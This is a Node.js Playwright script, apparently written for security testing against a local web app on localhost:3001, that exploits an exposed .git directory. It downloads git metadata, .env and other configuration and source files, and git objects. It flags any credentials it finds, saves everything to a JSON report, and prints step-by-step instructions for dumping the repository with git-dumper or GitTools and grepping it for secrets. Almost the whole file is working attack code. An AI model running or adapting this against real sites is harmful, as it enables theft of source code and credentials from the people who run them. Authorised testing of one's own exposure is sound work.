const { chromium } = require('playwright');
const fs = require('fs').promises;
const path = require('path');

const BASE_URL = 'http://localhost:3001';

async function exploitGitRepository() {
  console.log('üíÄ GIT REPOSITORY EXPLOITATION\n');
  console.log('Attempting to extract entire source code from exposed .git directory...\n');

  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  const extractedData = {};
  const sourceCode = {};

  // Essential git files to extract repository structure
  const gitFiles = [
    '/.git/HEAD',
    '/.git/config',
    '/.git/description',
    '/.git/index',
    '/.git/packed-refs',
    '/.git/refs/heads/main',
    '/.git/refs/heads/master',
    '/.git/refs/heads/develop',
    '/.git/logs/HEAD',
    '/.git/logs/refs/heads/main',
    '/.git/logs/refs/heads/master',
    '/.git/COMMIT_EDITMSG',
    '/.git/info/exclude',
    '/.git/info/refs',
    '/.git/objects/info/packs'
  ];

  console.log('üìÅ Extracting Git metadata...');
  for (const file of gitFiles) {
    try {
      const response = await page.goto(`${BASE_URL}${file}`, {
        waitUntil: 'domcontentloaded',
        timeout: 3000
      });

      if (response && response.status() === 200) {
        const content = await page.textContent('body');
        extractedData[file] = content;
        console.log(`‚úì Extracted: ${file}`);

        // Parse important information
        if (file === '/.git/HEAD') {
          const ref = content.match(/ref: (.+)/);
          if (ref) {
            console.log(`  Current branch: ${ref[1]}`);
          }
        }

        if (file === '/.git/config') {
          const remoteUrl = content.match(/url = (.+)/);
          if (remoteUrl) {
            console.log(`  üîë Remote repository: ${remoteUrl[1]}`);
          }
        }

        if (file.includes('/refs/heads/')) {
          console.log(`  Commit hash: ${content.substring(0, 40)}`);
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  // Try to extract actual source files through various methods
  console.log('\nüîç Attempting to extract source code files...');

  // Common source files to try
  const sourceFiles = [
    '/.env',
    '/.env.local',
    '/.env.production',
    '/package.json',
    '/package-lock.json',
    '/tsconfig.json',
    '/next.config.js',
    '/middleware.ts',
    '/app/layout.tsx',
    '/app/page.tsx',
    '/lib/auth.ts',
    '/lib/database.ts',
    '/lib/config.ts',
    '/api/auth/route.ts',
    '/api/clients/route.ts',
    '/README.md',
    '/docker-compose.yml',
    '/.github/workflows/deploy.yml'
  ];

  for (const file of sourceFiles) {
    try {
      const response = await page.goto(`${BASE_URL}${file}`, {
        waitUntil: 'networkidle',
        timeout: 3000
      });

      if (response && response.status() === 200) {
        const content = await page.textContent('body');

        // Check if we got actual file content (not HTML)
        if (!content.includes('<!DOCTYPE') && !content.includes('<html')) {
          sourceCode[file] = content;
          console.log(`‚úì SOURCE CODE EXTRACTED: ${file}`);

          // Look for sensitive data in source files
          if (content.includes('DATABASE_URL') ||
              content.includes('API_KEY') ||
              content.includes('SECRET') ||
              content.includes('PASSWORD')) {
            console.log(`  ‚ö†Ô∏è Contains credentials!`);
          }
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  // Try to extract git objects for reconstruction
  console.log('\nüîß Attempting to extract Git objects...');

  // Try to get recent commit hashes from logs
  if (extractedData['/.git/logs/HEAD']) {
    const logLines = extractedData['/.git/logs/HEAD'].split('\n');
    const commits = [];

    for (const line of logLines) {
      const match = line.match(/([0-9a-f]{40}) ([0-9a-f]{40})/);
      if (match) {
        commits.push(match[2]);
      }
    }

    console.log(`Found ${commits.length} commit hashes`);

    // Try to get commit objects
    for (const commit of commits.slice(0, 5)) { // Try first 5 commits
      const objectPath = `/.git/objects/${commit.substring(0, 2)}/${commit.substring(2)}`;
      try {
        const response = await page.goto(`${BASE_URL}${objectPath}`, {
          waitUntil: 'domcontentloaded',
          timeout: 2000
        });

        if (response && response.status() === 200) {
          console.log(`‚úì Git object accessible: ${commit}`);
        }
      } catch (e) {
        // Silent fail
      }
    }
  }

  await browser.close();

  // Generate exploitation report
  console.log('\n' + '='.repeat(60));
  console.log('üíÄ GIT REPOSITORY EXPLOITATION RESULTS');
  console.log('='.repeat(60));

  console.log('\nüö® CRITICAL FINDINGS:\n');

  if (Object.keys(extractedData).length > 0) {
    console.log('1. GIT DIRECTORY IS FULLY EXPOSED');
    console.log(`   - Extracted ${Object.keys(extractedData).length} Git metadata files`);
    console.log('   - Repository structure mapped');
    console.log('   - Commit history accessible');
    console.log('   - Can potentially reconstruct entire repository');
  }

  if (Object.keys(sourceCode).length > 0) {
    console.log('\n2. SOURCE CODE FILES DIRECTLY ACCESSIBLE');
    console.log(`   - Extracted ${Object.keys(sourceCode).length} source files`);
    console.log('   - Application logic exposed');
    console.log('   - Configuration files accessible');
    console.log('   - Potential for finding more vulnerabilities');
  }

  // Save all extracted data
  const exploitReport = {
    timestamp: new Date().toISOString(),
    gitMetadata: extractedData,
    sourceCode: sourceCode,
    summary: {
      gitFilesExtracted: Object.keys(extractedData).length,
      sourceFilesExtracted: Object.keys(sourceCode).length,
      containsCredentials: Object.values(sourceCode).some(content =>
        content.includes('PASSWORD') ||
        content.includes('SECRET') ||
        content.includes('API_KEY')
      )
    }
  };

  await fs.writeFile('git-repository-exploit.json', JSON.stringify(exploitReport, null, 2));
  console.log('\nüíæ Full repository data saved to git-repository-exploit.json');

  // Provide attack instructions
  console.log('\n' + '='.repeat(60));
  console.log('üéØ EXPLOITATION INSTRUCTIONS');
  console.log('='.repeat(60));

  console.log('\nTo fully exploit this vulnerability:\n');
  console.log('1. Use git-dumper tool to download entire .git directory:');
  console.log('   $ pip install git-dumper');
  console.log('   $ git-dumper http://localhost:3001/.git ./dumped-repo');
  console.log('\n2. Or use GitTools to extract repository:');
  console.log('   $ git clone https://github.com/internetwache/GitTools');
  console.log('   $ ./GitTools/Dumper/gitdumper.sh http://localhost:3001/.git ./dumped');
  console.log('\n3. Once downloaded, reconstruct repository:');
  console.log('   $ cd dumped-repo');
  console.log('   $ git checkout -- .');
  console.log('\n4. Search for credentials in source:');
  console.log('   $ grep -r "PASSWORD\\|SECRET\\|API_KEY\\|TOKEN" .');
  console.log('\n5. Review source code for additional vulnerabilities');

  return exploitReport;
}

// Run the exploit
exploitGitRepository().catch(console.error);